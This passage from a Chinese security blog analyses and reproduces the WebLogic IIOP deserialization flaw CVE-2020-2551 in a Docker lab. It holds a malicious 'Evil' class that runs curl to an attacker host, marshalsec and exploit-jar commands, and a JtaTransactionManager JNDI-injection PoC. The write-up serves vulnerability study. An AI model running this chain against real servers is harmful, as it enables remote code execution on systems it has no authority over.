+<p>ORB之间进行通信是通过GIOP协议完成的。GIOP定义了ORB之间互操作的传输语法和标准消息格式，比如请求头、请求体所包含的字段和长度</p>
+<h4 id="IDL"><a href="#IDL" class="headerlink" title="IDL"></a>IDL</h4><p>IDL全称接口定义语言，是用来描述软件组件接口的一种规范语言。用户可以定义模块、接口、属性、方法、输入输出参数，甚至异常等等，它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用</p>
+<p>就如上文所说，IDL是与编程语言无关的一种规范化描述性语言，不同的编程语言为了将其转化成IDL，都制定了一套自用的编译器用于将可读取的OMG IDL文件转换或映射成相应的接口或类型</p>
+<p>Java Standard Edition CORBA&#x2F;IIOP 实现被称为 Java IDL。 与 IDL 到 Java (idlj) 编译器一起，Java IDL 可用于定义、实现和访问 Java 编程语言中的 CORBA 对象</p>
+<h3 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h3><ol>
+<li><p>启动orbd作为naming service，会创建name service服务。</p>
+<p>ORBD可以理解为ORB的守护进程，其主要负责建立客户端(client side)与服务端(servant side)的关系，同时负责查找指定的IOR(可互操作对象引用，是一种数据结构，是CORBA标准的一部分)。ORBD是由Java原生支持的一个服务，其在整个CORBA通信中充当着naming service的作用，所以客户端和服务端要使用ORB，都要指定ORBD的端口和地址</p>
+</li>
+<li><p>corba server向orbd发送请求获取name service，协商好通信格式</p>
+</li>
+<li><p>orbd返回保存的name service</p>
+</li>
+<li><p>corba server拿到name service后将具体的实现类绑定到name service上，这个时候orbd会拿到注册后的信息，这个信息就是IOR</p>
+</li>
+<li><p>corba client向orbd发起请求获取name service。</p>
+</li>
+<li><p>orbd返回保存的name service。</p>
+</li>
+<li><p>corba client在name service中查找已经注册的信息获取到“引用”的信息(corba server的地址等)，通过orb的连接功能将远程方法调用的请求转发到corba server。</p>
+</li>
+<li><p>corba server通过orb接收请求，并利用POA拦截请求，将请求中所指定的类封装好，同样通过orb的连接功能返回给corba client</p>
+<p>Stub是client side调用orb的媒介，POA是servant side用于拦截client请求的媒介，而两者在结构上其实都是客户端&#x2F;服务端调用orb的媒介</p>
+</li>
+</ol>
+<h3 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h3><p>RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI的简单性和CORBA的多语言兼容性，克服了RMI只能用于Java的缺点和CORBA的复杂性（可以不用掌握IDL），稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，使得程序员能更方便的编写分布式程序设计，实现分布式计算</p>
+<p>在Weblogic中实现了RMI-IIOP模型</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200423103837351.png" alt="image-20200423103837351"></p>
+<p>Weblogic的文档把这个实现叫做RMI over IIOP</p>
+<h4 id="RMI-IIOP远程调用"><a href="#RMI-IIOP远程调用" class="headerlink" title="RMI-IIOP远程调用"></a>RMI-IIOP远程调用</h4><p>编写一个RMI IIOP远程调用步骤：</p>
+<ol>
+<li>定义远程接口类</li>
+<li>编写实现类</li>
+<li>编写服务端</li>
+<li>编写客户端</li>
+<li>编译代码并为服务端与客户端生成对应的使用类</li>
+</ol>
+<p>远程接口类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">PortableRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello !!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;com.sun.jndi.cosnaming.CNCtxFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化Hello servant</span></span><br><span class="line">            <span class="type">HelloImpl</span> <span class="variable">helloRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用JNDI在命名服务中发布引用</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;iiop://127.0.0.1:1050&quot;</span>);</span><br><span class="line">            initialContext.rebind(<span class="string">&quot;HelloService&quot;</span>, helloRef);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Server Ready...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Thread.currentThread().join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;com.sun.jndi.cosnaming.CNCtxFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;iiop://127.0.0.1:1050&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//从命名服务获取引用</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">objRef</span> <span class="operator">=</span> initialContext.lookup(<span class="string">&quot;HelloService&quot;</span>);</span><br><span class="line">            <span class="comment">//narrow引用为具体的对象</span></span><br><span class="line">            <span class="type">HelloInterface</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloInterface) PortableRemoteObject.narrow(objRef, HelloInterface.class);</span><br><span class="line"></span><br><span class="line">            hello.sayHello();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到客户端通过JNDI查找的方式获取到远程的Reference对象，然后调用执行该对象的方法</p>
+<p>先编译好以上代码</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141257107.png" alt="image-20200421141257107"></p>
+<p>然后生成服务端与客户端进行远程调用的代理类</p>
+<p>（rmic为远程对象生成 stub 和 skeleton）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmic -iiop rmi_iiop.HelloImpl</span><br></pre></td></tr></table></figure>
+
+<p>执行完成后，在下面生成了两个类（Tie用于服务端，Stub用于客户端）</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141537149.png" alt="image-20200421141537149"></p>
+<p>启动一个命名服务器，在本地监听1050端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost loaclhost</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141709648.png" alt="image-20200421141709648"></p>
+<p>然后先后运行服务端及客户端</p>
+<p>在服务端的控制台输出Hello !!，即完成了一次RMI IIOP远程调用</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141843980.png" alt="image-20200421141843980"></p>
+<h2 id="Weblogic环境搭建"><a href="#Weblogic环境搭建" class="headerlink" title="Weblogic环境搭建"></a>Weblogic环境搭建</h2><p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p>
+<p>下载需要的JDK和Weblogic Server，并构建镜像</p>
+<p>（后来复现没成功，排错的时候把JDK换为了7u10，高版本JDK会限制RMI远程类的加载，但部分版本可用LDAP绕过，最后证实当时问题为编译恶意类的JDK版本高于了靶机JDK版本，所以测试时尽量用相同版本JDK）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u10-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420140722312.png" alt="image-20200420140722312"></p>
+<p>运行容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic weblogic</span><br></pre></td></tr></table></figure>
+
+<p>将远程调试需要的目录从已运行的容器复制到本机并用idea打开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> weblogic:/u01/app/oracle/middleware/ ./middleware/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设置Project中的SDK为对应版本</p>
+<p>在libraries添加lib和modules两个目录</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152108993.png" alt="image-20200420152108993"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152127502.png" alt="image-20200420152127502"></p>
+<p>设置远程调试</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152247957.png" alt="image-20200420152247957"></p>
+<p>由于我Weblogic环境搭建在Linux虚拟机的Docker中，这里host是虚拟机ip</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>Windows宿主机ip：192.168.110.1</p>
+<p>Linux虚拟机ip：192.168.110.3</p>
+<p>Weblogic Docker ip：172.17.0.2</p>
+</blockquote>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422181352532.png" alt="image-20200422181352532"></p>
+<h3 id="Linux虚拟机中本地攻击Docker（成功）"><a href="#Linux虚拟机中本地攻击Docker（成功）" class="headerlink" title="Linux虚拟机中本地攻击Docker（成功）"></a>Linux虚拟机中本地攻击Docker（成功）</h3><p>编译恶意类，尽量使用和weblogic相同的版本编译</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;curl http://192.168.110.3:8080/success&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420165824498.png" alt="image-20200420165824498"></p>
+<p>本地起一个web服务</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170115466.png" alt="image-20200420170115466"></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>起一个RMI服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.110.3:8080/#Evil&quot;</span> 1099</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170216981.png" alt="image-20200420170216981"></p>
+<p>运行<a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic_CVE_2020_2551.jar 192.168.110.3 7001 rmi://192.168.110.3:1099/xxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170450094.png" alt="image-20200420170450094"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170758175.png" alt="image-20200420170758175"></p>
+<h3 id="宿主机攻击虚拟机中Docker（失败）"><a href="#宿主机攻击虚拟机中Docker（失败）" class="headerlink" title="宿主机攻击虚拟机中Docker（失败）"></a>宿主机攻击虚拟机中Docker（失败）</h3><p>RMI和WEB服务依旧在虚拟机中启动，在宿主机运行<a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a>攻击失败</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172040851.png" alt="image-20200420172040851"></p>
+<p>RMI服务未收到请求</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172142185.png" alt="image-20200420172142185"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>RMI-IIOP调用的过程和普通的RMI方法调用很相似，因此很容易想到RMI的反序列化漏洞（CVE-2017-3241），通过bind方法中发送序列化对象到服务端，服务端在读取的时候进行反序列化操作，从而触发漏洞</p>
+<p>关键代码如下</p>
+<p>JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在。</p>
+<p>weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类</p>
+<p>Gadgets为Ysoserial中的一个工具类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;7001&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">    env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">    env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, String.format(<span class="string">&quot;iiop://%s:%s&quot;</span>, ip, port));</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    <span class="comment">// get Object to Deserialize</span></span><br><span class="line">    <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">    jtaTransactionManager.setUserTransactionName(<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);</span><br><span class="line">    <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;pwned&quot;</span>, jtaTransactionManager), Remote.class);</span><br><span class="line">    context.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用Ysoserial内建的功能帮我们生成一个实现Remote接口的远程类</p>
+<p>至此，整个漏洞的原理：</p>
+<ol>
+<li><p>通过设置java.naming.provider.url的值为iiop:&#x2F;&#x2F;127.0.0.1:7001获取到对应的InitialContext对象，然后再bind操作的时候会将被绑定的对象进行序列化并发送到IIOP服务端。</p>
+</li>
+<li><p>Weblogic服务端在获取到请求的字节流时候进行反序列化操作触发漏洞。</p>
+</li>
+</ol>
+<h3 id="Context的生成以及bind的流程"><a href="#Context的生成以及bind的流程" class="headerlink" title="Context的生成以及bind的流程"></a>Context的生成以及bind的流程</h3><p>就如上文中的Demo，利用RMI-IIOP无论是写客户端还是服务端，都需要先获取Context对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>
+
+<p>在CORBA通信过程中，这一部分就是获取naming service的过程，对于客户端来说是获取其中存在的IOR引用以供后面的rpc流程使用；对于服务端来说，是用于完成对象注册</p>
+<p>为了方便后续理解Weblogic的解析逻辑，新建项目跟一下Context的生成过程，在libraries依旧要添加Weblogic的lib和modules两个目录</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, <span class="string">&quot;iiop://192.168.110.3:7001&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        context.bind(<span class="string">&quot;l3yx&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javax.naming.InitialContext#InitialContext(java.util.Hashtable&lt;?,?&gt;)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214031788.png" alt="image-20200421214031788"></p>
+<p>在environment参数中可以设置Context的静态变量来指定Context的初始化参数，包括JNDI_FACTORY、PROVIDER_URL</p>
+<p>javax.naming.InitialContext#init</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214219158.png" alt="image-20200421214219158"></p>
+<p>当在environment中设置了Context.INITIAL_CONTEXT_FACTORY后会尝试获取该Context factory</p>
+<p>javax.naming.InitialContext#getDefaultInitCtx</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214300874.png" alt="image-20200421214300874"></p>
+<p>javax.naming.spi.NamingManager#getInitialContext</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214646760.png" alt="image-20200421214646760"></p>
+<p>这里会根据设定的Context.INITIAL_CONTEXT_FACTORY，反射获取工厂类，之后调用其中的getInitialContext方法</p>
+<p>这里是Weblogic中所拓展的工程类weblogic.jndi.WLInitialContextFactory</p>
+<p>weblogic.jndi.WLInitialContextFactory#getInitialContext</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220001151.png" alt="image-20200421220001151"></p>
+<p>weblogic.jndi.Environment#getContext(java.lang.String, weblogic.rmi.spi.HostID)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220058194.png" alt="image-20200421220058194"></p>
+<p>weblogic.factories.iiop.iiopEnvironmentFactory#getInitialContext(weblogic.jndi.Environment, java.lang.String)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220217536.png" alt="image-20200421220217536"></p>
+<p>weblogic.corba.j2ee.naming.InitialContextFactoryImpl#getInitialContext(java.util.Hashtable, java.lang.String)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220343294.png" alt="image-20200421220343294"></p>
+<p>weblogic.corba.j2ee.naming.ORBHelper#getORBReference</p>
